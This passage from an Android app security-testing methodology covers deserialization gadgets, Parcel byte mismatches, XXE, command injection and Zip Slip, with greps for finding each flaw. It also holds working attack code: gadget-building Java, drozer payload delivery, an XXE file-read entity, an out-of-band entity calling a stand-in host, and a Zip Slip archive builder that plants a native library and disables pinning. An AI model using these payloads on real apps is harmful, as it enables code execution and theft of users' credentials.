  manipulation, a `readObject` side effect, a self-populated credential object) but is a different claim.
- **How:**
  ```bash
  grep -rnE 'ObjectInputStream|readObject\(|readUnshared|getSerializableExtra|readSerializable' out/sources/ \
    | grep -viE '^out/sources/(android|androidx)/'
  grep -rn 'implements Serializable' out/sources/ | wc -l
  grep -rn -A10 'private void readObject' out/sources/       # gadget candidates inside the app itself
  # gadget-bearing dependencies?
  unzip -l target.apk | grep -iE 'commons-collections|commons-beanutils|groovy|spring|snakeyaml|jodd|c3p0'
  # export status FIRST
  grep -n -B2 -A6 'android:exported="true"' out/AndroidManifest.xml
  ```
  Deliver arbitrary bytes without writing a PoC app:
  ```
  dz> run app.activity.start --component com.target.app com.target.app.ImportActivity \
          --extra bytearray payload 'base64(rO0ABXNyAB...)'
  dz> run app.broadcast.send --action com.target.app.IMPORT --extra bytearray payload 'hex(aced0005...)'
  ```
  Confirm the sink is reached:
  ```javascript
  Java.perform(function () {
    var OIS = Java.use('java.io.ObjectInputStream');
    OIS.readObject.implementation = function () {
      var o = this.readObject();
      console.log('[readObject] -> ' + (o ? o.$className : 'null'));
      return o;
    };
  });
  ```
- **Proof:** The `readObject` hook printing a class name you supplied, proving the app instantiates
  attacker-chosen types — then an impact: a file written, a state change, or a credential object populated
  and leaked. Report what you demonstrated, not the theoretical maximum.
- **Escalation:** → D17-044 to build the gadget; → D13 when the deserialized object carries a token
  (the PayPal and Basecamp shapes both end in account takeover).
- **Ruled out when:** Every `readObject`/`getSerializableExtra` call site sits behind a component that is
  `android:exported="false"` with no `<intent-filter>` and no `grantUriPermissions` path to it; or the
  stream is guarded by an `ObjectInputFilter` allow-list (see D17-050). Name the component and quote the
  manifest line.

### D17-044 · Build the gadget from the target's own DEX

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | `targetSdk < 33` is where the untyped getters are the default idiom; from API 33 the typed overloads exist and their **absence** at a hit is the finding |
| **Maps to** | Hacktive Security, *"Android Deserialization Deep Dive"* (2025-03-13) — the `getSerializableExtra()` → `Bundle` → `ObjectInputStream.readObject()` chain with a ClassLoader spanning app and system paths, and the DEX-extract → reflect → re-serialise workflow; `risks/unsafe-deserialization` |

- **Test:** You do not need a public gadget library. The victim's own classes are on its classpath, so the
  gadget you want is usually already in `classes.dex`. Load the target's APK in your PoC app, reflect the
  candidate class, set its fields, and serialise it.
- **How:**
  ```java
  DexClassLoader dcl = new DexClassLoader(targetApkPath, getCodeCacheDir().getAbsolutePath(),
                                          null, getClassLoader());
  Class<?> g = dcl.loadClass("com.target.SomeGadget");
  Object o = g.newInstance();
  Field f = g.getDeclaredField("path"); f.setAccessible(true);
  f.set(o, "/data/data/com.target.app/files/pwn_marker");
  Intent i = new Intent();
  i.setClassName("com.target.app", "com.target.app.ExportedActivity");
  i.putExtra("so", (Serializable) o);
  startActivity(i);
  ```
  ```bash
  adb shell pm path com.target.app          # the sourceDir to hand to DexClassLoader
  adb shell run-as com.target.app ls -l files/pwn_marker
  ```
- **Proof:** The gadget's `readObject()` side effect observable under the victim's UID — a file created at
  the path you set, visible via `run-as`.
- **Escalation:** → D17-009's landing sites (a file write into a code-load path completes the chain).
- **Ruled out when:** No class in the app's own classpath has a `readObject`, `finalize` or field-setter
  side effect reachable from the deserialized graph — enumerate the `implements Serializable` set and say
  how many you triaged.

### D17-045 · Untyped `getParcelableExtra` / `getSerializableExtra` on an API 33+ target

| | |
|---|---|
| **Severity ceiling** | Medium as a hardening gap; High when a crafted type reaches a sink |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the reachable case; hardening alone is P5 |
| **Attacker** | AM-03 |
| **Applies to** | typed overloads exist from **API 33 (Android 13)**; **LEGACY** below that, where `BundleCompat`/`IntentCompat` are the available fix — so the untyped call is still a finding on any `targetSdk` |
| **Maps to** | `risks/unsafe-deserialization` — use `Intent.getParcelableExtra(String, Class<T>)`, `Intent.getParcelableArrayListExtra(String, Class<? extends T>)`, `Parcel.readParcelable(ClassLoader, Class<T>)`; "catches type mismatches before deserialization, preventing privilege escalation (e.g. CVE-2021-0928)"; michalbednarski/TheLastBundleMismatch — **CVE-2023-45777**, where the patch "adds the type parameter to the original call"; MASWE-0050 |

- **Test:** The untyped overloads instantiate whatever class the `Parcel` names, using the supplied
  `ClassLoader`, *before* any type check the app then performs. The typed API 33 overloads validate first.
  Code still using the untyped form on externally-sourced data keeps the type-confusion surface open — the
  exact gap CVE-2023-45777 exploited in `AccountManagerService`.
- **How:**
  ```bash
  grep -rnE 'getParcelable\(\s*[^,)]+\s*\)|getParcelableExtra\(\s*[^,)]+\s*\)|getParcelableArrayListExtra\(\s*[^,)]+\s*\)|getSerializable\(\s*[^,)]+\s*\)|getSerializableExtra\(\s*[^,)]+\s*\)|readParcelable\(\s*[^,)]+\s*\)' out/sources/ \
    | grep -viE '^out/sources/(android|androidx)/'
  # the safe forms name a class:
  grep -rnE 'getParcelable\([^,]+,\s*[A-Za-z.]+(::class\.java|\.class)|IntentCompat\.getParcelableExtra|BundleCompat\.getParcelable' out/sources/
  grep -rnE 'setClassLoader\(|BadParcelableException' out/sources/
  ```
- **Proof:** An untyped call on a `Bundle`/`Intent` originating from an exported component, a notification,
  a widget fill-in or a Wear message — plus a crafted Intent carrying a different `Parcelable` type for that
  key producing a `ClassCastException`/`BadParcelableException` in the target, which is evidence the class
  was instantiated *before* the type check.
- **Escalation:** → D17-046 (the byte-mismatch variant), → D08 when the confused object is a nested Intent.
  Note the platform-level lesson from CVE-2023-45777: even a typed check helps only if it is applied
  *before* the value is used.
- **Ruled out when:** Every call site on externally-sourced data uses the typed overload or the
  `IntentCompat`/`BundleCompat` helper; internal-only call sites are exempt but name them.

### D17-046 · `Parcelable` write/read byte mismatch — the self-changing Bundle

| | |
|---|---|
| **Severity ceiling** | High to Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the app-level component-access bypass; `server_side_injection.remote_code_execution_rce` (P1) where the smuggled object reaches a code sink |
| **Attacker** | AM-03 |
| **Applies to** | all. API 33's typed read APIs mitigate the *type-confusion* variant but **not** a byte-count mismatch inside a class the app itself defines. Android 13's length-prefixed `LazyValue` limits *cascading* corruption but, per CVE-2023-45777, does not save code that deserializes without a type |
| **Maps to** | michalbednarski/ReparcelBug2 — **CVE-2021-0928** ("a `writeToParcel`/`createFromParcel` serialization mismatch in `OutputConfiguration`"), with the four detection signs: exception suppression in `createFromParcel`; untyped collections via `readList()` without a ClassLoader constraint; nested variable-length objects; mismatched field counts. michalbednarski/LeakValue — **CVE-2022-20452** ("privilege escalation … via LazyValue using Parcel after `recycle()`"), and **CVE-2022-20474**. michalbednarski/TheLastBundleMismatch — **CVE-2023-45777**. Also **CVE-2023-20963** (WorkSource parcel/unparcel mismatch, exploited in the wild per Project Zero's RCA), **CVE-2024-49744**, **CVE-2024-49746** (`Parcel::continueWrite` closing FDs later used), **CVE-2024-34740**, **CVE-2017-0806** (GateKeeperResponse), **CVE-2021-0748** (ParsingPackageImpl); Bundle Fengshui (Bundle magic `0x4C444E42`, length-prefixed lazy unparcel, AccountManagerService→Settings uid 1000 launchAnyWhere). Google's Android & Google Devices in-scope impact list names this explicitly: *"Deserialization & Gadget Chains: Viable gadget chains (e.g., Parcel Mismatch)"*. MASWE-0050 |

- **Test:** It is the responsibility of a `Parcelable` implementation to ensure `createFromParcel` reads the
  same number of bytes `writeToParcel` wrote. When they diverge — usually because `createFromParcel` has a
  try/catch that swallows an exception mid-read, or a field was added to the writer and not the reader —
  the unread bytes are interpreted as the **next** object. An attacker who controls one field smuggles a
  different object into a later field, past whatever validation ran in between.
- **How:**
  ```bash
  # every app-defined Parcelable, with a crude write/read count per class
  grep -rln 'implements Parcelable\|: Parcelable' out/sources/ | while read f; do
    w=$(sed -n '/writeToParcel/,/^    }/p' "$f" | grep -cE 'write[A-Z][A-Za-z]*\(')
    r=$(sed -n '/createFromParcel/,/^        }/p;/protected .*(Parcel/,/^    }/p' "$f" | grep -cE 'read[A-Z][A-Za-z]*\(')
    [ "$w" != "$r" ] && echo "MISMATCH-CANDIDATE $f writes=$w reads=$r"
  done
  # the four warning signs
  grep -rn -A25 'createFromParcel' out/sources/ | grep -nE 'catch\s*\(|readList\(|readParcelable\(|readBundle\(|readSerializable\('
  # does the app cross a process boundary at all?
  grep -n 'android:process' out/AndroidManifest.xml
  grep -rn 'multiprocess\|RemoteWorkManager\|RemoteListenableWorker\|androidx.work.multiprocess' out/sources/ out/AndroidManifest.xml
  ```
  Instrument the deltas rather than trusting the grep count:
  ```javascript
  Java.perform(function () {
    var C  = Java.use("com.target.app.model.Thing");
    var CR = Java.use("com.target.app.model.Thing$1");     // the CREATOR
    C.writeToParcel.implementation = function (p, f) {
      var a = p.dataPosition(); this.writeToParcel(p, f);
      console.log("write delta=" + (p.dataPosition() - a));
    };
    CR.createFromParcel.overload('android.os.Parcel').implementation = function (p) {
      var a = p.dataPosition(); var r = this.createFromParcel(p);
      console.log("read  delta=" + (p.dataPosition() - a)); return r;
    };
  });
  ```
- **Proof:** Unequal write/read deltas for the same class (or `Parcel.dataPosition()` after
  `createFromParcel` differing from `dataSize()` in a harness), and then a crafted `Bundle` in which the
  validating code path observes key set `{a}` while the downstream component logs `{a, injected}` — print
  the two key sets side by side.
- **Escalation:** In an app context the payoff is usually forwarding a forged `Intent` past a check, i.e.
  D08 intent redirection with the validation defeated. Against platform code it is local privilege
  escalation — escalate to the platform/OEM VRP in addition to the app owner.
- **Ruled out when:** Every app-defined `Parcelable` has matching write/read counts (verified by the
  `dataPosition` harness, not by the grep), no `createFromParcel` swallows an exception, and the app never
  forwards a `Bundle` it received across a process boundary.

### D17-047 · A `Bundle` validated in one place and re-read in another

| | |
|---|---|
| **Severity ceiling** | Critical when it crosses a privilege boundary; High within an app |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES); `broken_authentication_and_session_management.authentication_bypass` (P1) where the check being defeated is an auth check |
| **Attacker** | AM-03 |
| **Applies to** | all; the generalised rule is **any Bundle that is validated in one process and used in another** |
| **Maps to** | CVE-2023-45777 (the `bundle.getParcelable(KEY_INTENT)` without a type parameter; the patch is a one-token change to `bundle.getParcelable(KEY_INTENT, Intent.class)`); Bundle Fengshui; MASWE-0050 |

- **Test:** The greppable corollary to D17-046. Find every place the app reads a value from an externally
  sourced `Bundle` to make a decision and then **forwards the same Bundle** onward. Three specific tells:
  (1) a validation read followed by a forward of the *same* Bundle; (2) an untyped `getParcelable(KEY)`
  inside a security check; (3) any interaction with `Parcel.ReadWriteHelper` or the lazy-bundle machinery.
- **How:**
  ```bash
  grep -rnE 'getExtras\(\)' -A8 out/sources/ | grep -E 'putExtras|startActivity|sendBroadcast|\.send\(|bindService'
  grep -rnE 'getParcelable\("[^"]+"\)|bundle\.get\(' out/sources/     # untyped read before a security decision
  grep -rn 'setDefusable\|BadParcelableException\|ReadWriteHelper' out/sources/
  ```
- **Proof:** The receiving component acting on a different value than the validating component saw —
  instrument both sides and print the two values in the same capture.
- **Escalation:** → D08 (the forwarded-Bundle path is the delivery vehicle), → D06 for the bound-service
  variant.
- **Ruled out when:** Every externally sourced `Bundle` is either fully re-validated at the consumer or
  destructured into primitives before forwarding (the app never passes the original `Bundle` object on).

### D17-048 · JSON / wrapper deserialization with an attacker-controlled class name

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the memory-corruption variant; `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for the state-disclosure variant |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | Oversecured's `ParcelableJsonWrapper` class; `risks/unsafe-deserialization`; the known-gadget set `OpenSSLX509Certificate`, `VirtualRefBasePtr`, `MemoryIntArray`; MASWE-0050 |

- **Test:** Code that parses attacker-controlled JSON into an **attacker-controlled `Class`** — Gson,
  Jackson, Fastjson, or a `Parcelable`/`Serializable` wrapper carrying `className` + `jsonData` — lets the
  parser set fields by reflection **before the constructor runs**. Two payload shapes matter.
- **How:**
  ```bash
  # the target Class is a VARIABLE, not a literal
  grep -rnE 'fromJson\([^,]+,\s*[a-z][A-Za-z0-9_]*\)|readValue\([^,]+,\s*[a-z][A-Za-z0-9_]*\)|JSON\.parseObject\(' out/sources/
  # wrapper shape: a className/clazz/type field beside a jsonData/data field
  grep -rnE 'className|clazz|"type"' -A6 out/sources/ | grep -nE 'jsonData|"data"|Class\.forName'
  grep -rnE 'enableDefaultTyping|activateDefaultTyping|@JsonTypeInfo' out/sources/
  ```
  The two worked shapes:
  ```text
  // memory corruption
  ParcelableJsonWrapper("com.android.internal.util.VirtualRefBasePtr", "{'mNativePtr':3735928551}")
  // secret disclosure — class populates itself from the app's own state, then you echo it back
  className = "com.target.auth.AuthRememberedStateManager"
  ```
  For the disclosure variant, pair it with an activity that echoes the full `Intent` through `setResult`
  and read the populated object in your `onActivityResult`.
- **Proof:** For the corruption variant, a native crash whose tombstone shows the pointer you supplied. For
  the disclosure variant, the self-populated auth state returned into your `onActivityResult` — dump the
  fields.
- **Escalation:** The auth-state variant chains directly into D08's full-Intent echo; the pointer variant
  into D16.
- **Ruled out when:** Every deserialization target `Class` is a compile-time literal, no polymorphic or
  default typing is enabled, and no wrapper carries a class name from an untrusted source.

### D17-049 · Exotic deserializers — `Intent.parseUri`, byte-array→`Parcel`, custom unmarshallers

| | |
|---|---|
| **Severity ceiling** | High to Critical depending on gadget availability |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES); P1 with a gadget |
| **Attacker** | AM-02 / AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/unsafe-deserialization`; Oversecured, *"Android: Access to app protected components"* ("exotic variants … casting byte arrays to Parcel objects and deserializing Intents directly"); MASWE-0050 |

- **Test:** Beyond `Parcel` and `ObjectInputStream`: `Intent.parseUri(..., URI_INTENT_SCHEME)` on attacker
  data reconstructs a full Intent (component, flags, extras) from a string; `Parcel.obtain()` +
  `unmarshall(bytes, 0, len)` turns an arbitrary byte array into a Parcel the app then reads.
- **How:**
  ```bash
  grep -rnE 'Intent\.parseUri|URI_INTENT_SCHEME|URI_ANDROID_APP_SCHEME|URI_ALLOW_UNSAFE|Intent\.getIntent\(' -A6 out/sources/
  grep -rnE 'Parcel\.obtain\(\)|\.unmarshall\(|setDataPosition\(' -A6 out/sources/
  grep -rnE 'ObjectInputStream|enableDefaultTyping|@JsonTypeInfo' -A3 out/sources/
  ```
- **Proof:** The sink reached from an exported component or a deep link, plus an object of an unexpected
  class materialising — log the runtime class from a Frida hook on the sink.
- **Escalation:** `parseUri` with a component set is straight intent redirection (→ D08); the byte-array
  Parcel variant feeds D17-046.
- **Ruled out when:** No `parseUri`/`unmarshall` call takes externally sourced data, or every such call is
  followed by an explicit component and flag scrub before use.

### D17-050 · `ObjectInputFilter` absent on an untrusted stream

| | |
|---|---|
| **Severity ceiling** | High (it is the control whose absence makes D17-043 exploitable) |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) for the missing control; rate the chain at D17-043's node |
| **Attacker** | AM-03 |
| **Applies to** | `java.io.ObjectInputFilter` is available on Android from **API 30**. Below that the control must be a manual `resolveClass` override — check for one |
| **Maps to** | `risks/unsafe-deserialization` (CVE-2014-7911 `ObjectInputStream`/Android < 5.0, the look-ahead `ObjectInputFilter` mitigation, and a `readObject` that throws) |

- **Test:** A look-ahead filter rejects unexpected classes *before* they are instantiated. Its absence on a
  stream fed from IPC, a file or a network response is the difference between "deserializes untrusted data"
  and "deserializes untrusted data safely".
- **How:**
  ```bash
  grep -rnE 'ObjectInputStream' -A10 out/sources/ | grep -nE 'setObjectInputFilter|ObjectInputFilter|resolveClass'
  grep -rn 'setObjectInputFilter\|ObjectInputFilter\.Config' out/sources/
  grep -n 'minSdkVersion' out/apktool.yml
  ```
- **Proof:** An `ObjectInputStream` constructed over attacker-reachable bytes with no filter and no
  `resolveClass` override, plus a crash or behaviour change from a crafted stream naming a class the app
  never expected.
- **Escalation:** → D17-043/044.
- **Ruled out when:** Every untrusted `ObjectInputStream` has an allow-list filter (or a `resolveClass`
  override that throws for anything outside a named set) — quote the allow-list.

### D17-051 · The native-pointer `Serializable` / `Parcelable` gadget shape

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all; the detection rule is mechanical |
| **Maps to** | GitHub Security Lab's Android deserialization history — **CVE-2014-7911** (`BinderProxy` `mObject`/`mOrgue`), **CVE-2015-3825** (`OpenSSLX509Certificate.mContext`), `MemoryIntArray` (`mMemoryAddr`/`mOwnerPid`), **CVE-2017-0871** (`ParcelableException` invoking constructors via `Class.forName()` reflection); their detection rule: a `Serializable`/`Parcelable` class with a `finalize()` that calls a native method and a non-transient `long` pointer field |

- **Test:** Search the app **and its dependencies** for the shape that made Android's historic
  deserialization bugs exploitable: a serializable class holding a native pointer in a non-transient
  `long`, with a `finalize()` (or any native method) that dereferences it. Deserializing such a class with
  an attacker-chosen pointer value is memory corruption without any traditional gadget chain.
- **How:**
  ```bash
  grep -rn -A30 'implements +\(java\.io\.\)\?Serializable' out/sources/ \
    | grep -nE 'protected void finalize|native |long +m[A-Z][A-Za-z]*;'
  grep -rn -A30 'implements Parcelable' out/sources/ \
    | grep -nE 'protected void finalize|native |long +m[A-Z][A-Za-z]*;'
  ```
- **Proof:** The class listing (fields + `finalize`), plus a tombstone from delivering an instance with a
  poisoned pointer through the sink you found in D17-043.
- **Escalation:** → D16 for exploitability triage of the corruption.
- **Ruled out when:** No serializable class in the app or its shipped dependencies pairs a non-transient
  native pointer with a native-calling `finalize`, and every native handle is `transient`.

### D17-052 · jackson-databind — prove the three preconditions, never the version

| | |
|---|---|
| **Severity ceiling** | **Critical** if all three hold; **not a finding** otherwise — and reporting the verified absence is worth credibility |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) with all three; `using_components_with_known_vulnerabilities.outdated_software_version` (P5) if you file the version alone |
| **Attacker** | AM-03 / AM-09 |
| **Applies to** | jackson-databind on Android (uncommon, but present in enterprise/MDM/SDK code). The version cut-off that matters is **2.10**, which introduced "Safe Default Typing" requiring an allow list; 2.9.x and earlier used a deny list of ~90 classes across 30–40 libraries |
| **Maps to** | Jackson wiki *"Jackson Polymorphic Deserialization CVE Criteria"* — requires (a) the service accepts JSON from untrusted sources, (b) Default Typing enabled or an equivalent `@JsonTypeInfo` with `java.lang.Object` as base type, (c) gadget classes on the classpath; "these attacks do NOT work against default configuration of ObjectMapper". Family origin **CVE-2017-7525**; **CVE-2018-12022** (jodd-db gadget); **CVE-2020-36180** |

- **Test:** Do not file a jackson gadget CVE on version alone. Prove the three conditions the maintainers
  themselves define.
- **How:**
  ```bash
  grep -rn 'enableDefaultTyping\|activateDefaultTyping\|DefaultTyping\.' out/sources/
  grep -rn '@JsonTypeInfo' out/sources/ | grep -iE 'Id\.CLASS|MINIMAL_CLASS|use *= *JsonTypeInfo\.Id\.CLASS'
  grep -rn 'com.fasterxml.jackson' --include='*.gradle*' --include='*.toml' .
  ./gradlew :app:dependencies --configuration releaseRuntimeClasspath \
    | grep -iE 'c3p0|jodd|commons-dbcp|hibernate|logback|spring-|xalan|ehcache'
  ```
- **Proof:** All three together: (1) a hit on `enableDefaultTyping`/`activateDefaultTyping`, or a
  `@JsonTypeInfo` using `Id.CLASS`/`MINIMAL_CLASS` on an `Object`-typed field; (2) a gadget library in the
  resolved graph; (3) a trace showing untrusted JSON reaching that `ObjectMapper`. Anything less is a false
  positive — close it yourself.
- **Escalation:** RCE in the app process when all three hold.
- **Ruled out when:** No default typing is enabled, no `@JsonTypeInfo` on an `Object` base type, or no
  gadget library in the resolved graph. Name which of the three failed.

### D17-053 · Gson below 2.8.9 — reachability or nothing

| | |
|---|---|
| **Severity ceiling** | Medium at most on Android in practice |
| **VRT** | `using_components_with_known_vulnerabilities.outdated_software_version` (P5) without reachability; `application_level_denial_of_service_dos.*` if you can take a service down |
| **Attacker** | AM-03 |
| **Applies to** | Gson `< 2.8.9` |
| **Maps to** | **CVE-2022-25647 / GHSA-4jrv-ppp4-jm57** — `com.google.code.gson:gson`, all versions before **2.8.9** (covering 1.1–1.7.2 and 2.0–2.8.8), fixed in 2.8.9 (Gson PR #1991), CWE-502, CVSS 3.1 **7.7** (`AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:H`); mechanism: "Deserialization of Untrusted Data via the `writeReplace()` method in internal classes" |

- **Test:** Establish the Gson version, then establish whether **Java serialization** of Gson internal types
  ever touches untrusted data. Gson's normal JSON path is *not* the issue, and reporting it as such is the
  fastest way to look like a scanner.
- **How:**
  ```bash
  grep -rn "com.google.code.gson" --include='*.gradle*' --include='*.toml' .
  unzip -p target.apk 'META-INF/*.version' | grep -i gson
  grep -rnE 'ObjectInputStream|readObject\(|Serializable' out/sources/ | grep -viE '^out/sources/(android|androidx)/' | head -40
  grep -rnE 'getSerializableExtra|putSerializable' out/sources/ | grep -viE '^out/sources/(android|androidx)/'
  ```
- **Proof:** Gson `< 2.8.9` in the resolved graph **plus** a code path reading a
  `Serializable`/`ObjectInputStream` from an attacker source. Without the second half, report it as
  informational and say so explicitly.
- **Escalation:** Rarely chains on Android — use it as evidence of an unmaintained dependency policy
  rather than as a finding.
- **Ruled out when:** Gson `≥ 2.8.9`, or no Java serialization path touches Gson internal types anywhere in
  the app.

### D17-054 · XXE in the app's own XML parsing

| | |
|---|---|
| **Severity ceiling** | High to Critical |
| **VRT** | `server_side_injection.xml_external_entity_injection_xxe` (P1); the read primitive maps to `server_side_injection.file_inclusion.local` (P1) |
| **Attacker** | AM-02 (a file or deep-link payload) / AM-03 / AM-09 |
| **Applies to** | all |
| **Maps to** | `risks/xml-external-entities-injection`; MASTG-KNOW-0021 ("the true danger in XML lies in the XML eXternal Entity (XXE) attack as it might allow for reading external data sources that are still accessible within the application"); MASTG-TEST-0337; MASWE-0050; mobsfscan rules `xmlinputfactory_xxe`, `xmlinputfactory_xxe_enabled`, `xml_decoder_xxe`, `android_kotlin_xmlinputfactory_xxe`, `android_kotlin_xml_decoder_xxe` |

- **Test:** XML parsers configured to resolve external entities on attacker-influenced input read local
  files as the app's UID and make outbound requests from the device. The tell is a factory created with
  **no** hardening calls.
- **How:**
  ```bash
  grep -rnE 'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|XmlPullParserFactory|TransformerFactory|XMLReader|XMLDecoder' -A12 out/sources/ \
    | grep -vnE 'setFeature|setProperty|IS_SUPPORTING_EXTERNAL_ENTITIES|disallow-doctype-decl|external-general-entities|external-parameter-entities|setExpandEntityReferences|XMLConstants'
  ```
  Payload into whatever XML sink you found (a deep-link parameter, a provider write, an imported file, a
  downloaded config):
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY x SYSTEM "file:///data/data/com.target.app/shared_prefs/auth.xml">]>
  <r>&x;</r>
  ```
  Out-of-band variant: `<!ENTITY % x SYSTEM "https://poc.example.invalid/PWNMARK7f3a91">`.
- **Proof:** The app's own private file contents appearing in the parsed output, in an error message, or in
  an outbound request captured on your listener.
- **Escalation:** File read → D11 secrets → D13 token → D15 backend. SSRF from the device.
- **Ruled out when:** Every parser factory sets `disallow-doctype-decl=true` (or `SUPPORT_DTD=false` /
  `IS_SUPPORTING_EXTERNAL_ENTITIES=false`), or `XMLConstants.FEATURE_SECURE_PROCESSING` — quote the
  hardening lines per factory, not per file.

### D17-055 · `Runtime.exec` — the nuance that bounds the claim

| | |
|---|---|
| **Severity ceiling** | Critical only when a shell is invoked with attacker data; otherwise argument injection rated on the target binary |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) with a shell; `insecure_os_firmware.command_injection` (P1) on an OEM/firmware target |
| **Attacker** | AM-02 / AM-03 |
| **Applies to** | all; "root helper" and device-control code first |
| **Maps to** | mobsfscan `command_injection`, `command_injection_warning` ("A formatted or concatenated string was detected as input to a …"), `android_kotlin_command_injection*`; MobSF `api_os_command`; MASWE-0050 |

- **Test:** `Runtime.getRuntime().exec(String)` is **shell-less** — it splits on whitespace with no
  metacharacter shell — so a concatenated argument gives you at most **argument injection** unless a shell
  is explicitly invoked (`sh -c`, `bash -c`, `su -c`). State which one you have; overclaiming here is the
  most common way a command-execution report gets closed.
- **How:**
  ```bash
  grep -rnE 'Runtime\.getRuntime\(\)\.exec|ProcessBuilder' -B8 -A4 out/sources/
  grep -rnE 'exec\(' -B4 out/sources/ | grep -nE '\+|String\.format|format\(|\bsh\b|-c'
  ```
- **Proof:** With a shell: an injected separator (`;`, `&&`, `$( )`) producing your command's side effect
  inside the app's UID (a file created under `/data/data/com.target.app/`). Without one: the flag or path
  you controlled changing the invoked binary's behaviour — name the binary and the behaviour.
- **Escalation:** A shell plus a writable download path is D17-007's terminal step.
- **Ruled out when:** Every `exec` call takes a `String[]` with no attacker-controlled element, or the
  concatenated element is validated against an allow-list — quote the allow-list.

### D17-056 · Zip Slip into a code-load path — the four landing sites

| | |
|---|---|
| **Severity ceiling** | **Critical** (code execution) / High (integrity) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the write lands on code; `server_security_misconfiguration.path_traversal` (VARIES) for the write alone |
| **Attacker** | AM-02 (the user imports an archive) / AM-03 (via a share intent or provider) / AM-09 |
| **Applies to** | all. `java.util.zip` does **not** validate entry names. Platform protection only at **targetSdk ≥ 34** |
| **Maps to** | `risks/zip-path-traversal` ("Applications that unzip archive files without sanitizing the target file paths … are susceptible to overwriting their internal files with attacker-provided files"; the fix is `getCanonicalPath().startsWith(targetPath.getCanonicalPath() + File.separator)`, whose absence is the bug); Google Play ASI campaigns **"Zipfile Path Traversal"** (started 2019-05-21) and **"Path Traversal"** (2017-09-22); **CVE-2020-8913** as the same class (`split_id` = `../verified-splits/config.test`); **CVE-2026-27704** (Dart/Flutter Pub extraction, see D17-071) |

- **Test:** Any extraction loop that concatenates `entry.getName()` onto a base directory without canonical
  validation writes outside that directory. Whenever you find one, the next question is *where to land it*.
  Four targets recur across public exploits:
  1. `files/lib/<name>.so`, or any path the app later `System.load()`s — the Xiaomi shape.
  2. `verified-splits/config.*` — added to the ClassLoader automatically and marked already-verified.
  3. `databases/<name>.db-journal` — SQLite replays it (see D11).
  4. `shared_prefs/<name>.xml.bak` — `SharedPreferencesImpl` swaps it in (see D11), which flips a security
     flag without any code execution at all.
- **How:**
  ```bash
  grep -rnE 'ZipInputStream|ZipFile|ZipEntry|getNextEntry\(|TarArchiveInputStream' -A20 out/sources/ \
    | grep -nE 'getName\(\)' -A6 | grep -vnE 'getCanonicalPath|startsWith|normalize\(\)'
  # third-party unzip helpers are frequently vulnerable too
  grep -rn 'net.lingala.zip4j\|org.apache.commons.compress\|unzip' out/sources/ | head
  ```
  ```python
  import zipfile
  z = zipfile.ZipFile('evil.zip', 'w')
  z.writestr('../../../../data/data/com.target.app/files/lib/libpwn.so', open('payload.so','rb').read())
  z.writestr('../../shared_prefs/config.xml', '<?xml version="1.0"?><map><boolean name="pinning" value="false"/></map>')
  z.writestr('../databases/app.db-journal', open('journal.bin','rb').read())
  z.close()
  ```
  Feed it through the feature's own import path — share intent, file picker, download, update channel.
- **Proof:** `adb shell run-as com.target.app ls -la files/lib databases/ shared_prefs/` showing your
  entries at the traversed paths, then either the app loading your `.so`/dex, or the planted config
  honoured (a behaviour change you can point at).
- **Escalation:** → D17-013 / D17-012 for the code-load landing; → D11 for the prefs and journal landings.
- **Ruled out when:** Every extraction loop canonicalises and asserts the prefix before writing (quote the
  assertion), **or** the app targets 34+ and calls no `ZipPathValidator.clearCallback()` **and** uses only
  `ZipFile(String)`/`ZipInputStream.getNextEntry()` rather than a third-party unzip helper that bypasses
  the platform check.

### D17-057 · `ZipPathValidator.clearCallback()` — a deliberate opt-out of the platform fix

| | |
|---|---|
| **Severity ceiling** | High (it re-enables zip slip process-wide) |
| **VRT** | `server_security_misconfiguration.path_traversal` (VARIES) → `server_side_injection.remote_code_execution_rce` (P1) chained |
| **Attacker** | AM-02 / AM-03 |
| **Applies to** | targetSdk ≥ 34 — below 34 there is nothing to opt out of and the class is fully live anyway (LEGACY) |
| **Maps to** | `about/versions/14/behavior-changes-14` — `ZipFile(String)` and `ZipInputStream.getNextEntry()` throw `ZipException` for entries containing `".."` or starting with `"/"`, with `dalvik.system.ZipPathValidator.clearCallback()` as the documented opt-out; `risks/zip-path-traversal` (MASVS-STORAGE) |

- **Test:** Its presence in a 34+ app means a developer deliberately turned the mitigation off — usually
  because a legitimate archive format broke. That is a finding in itself, and it re-opens D17-056 for the
  whole process.
- **How:**
  ```bash
  grep -rn 'ZipPathValidator\|clearCallback' out/sources/
  grep -n 'targetSdkVersion' out/apktool.yml
  # confirm behaviourally
  adb push evil.zip /sdcard/Download/ && # import it through the app, then:
  adb shell run-as com.target.app ls shared_prefs/
  ```
- **Proof:** The `clearCallback()` call site quoted with its file and line, plus the traversal succeeding on
  a 34+ device (with the call removed the same archive raises `ZipException` — capture both).
- **Escalation:** → D17-056's landing sites.
- **Ruled out when:** No `ZipPathValidator` reference anywhere in the app's own or its dependencies' code.

### D17-058 · Symlink entries and non-empty destination directories

| | |
|---|---|
| **Severity ceiling** | **Critical** when the symlink target is later written or loaded |
| **VRT** | `server_security_misconfiguration.path_traversal` (VARIES) → `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-02 / AM-03 |
| **Applies to** | all apps extracting downloaded or user-supplied archives |
